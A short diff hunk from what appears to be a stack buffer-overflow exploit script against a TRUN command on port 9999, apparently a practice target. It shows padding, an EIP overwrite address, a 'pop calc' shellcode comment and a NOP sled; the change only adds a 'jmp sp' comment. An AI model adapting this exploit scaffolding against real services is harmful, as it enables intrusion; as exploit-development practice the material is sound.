@@ -6,7 +6,7 @@ port = 9999
 
 prefix = b'TRUN '
 buffer = b'.' * 2007
-eip = pack('<L', 0x625012f0)
+eip = pack('<L', 0x625012f0) # jmp sp
 
 # pop calc
 sc =  b"\x90" * 16
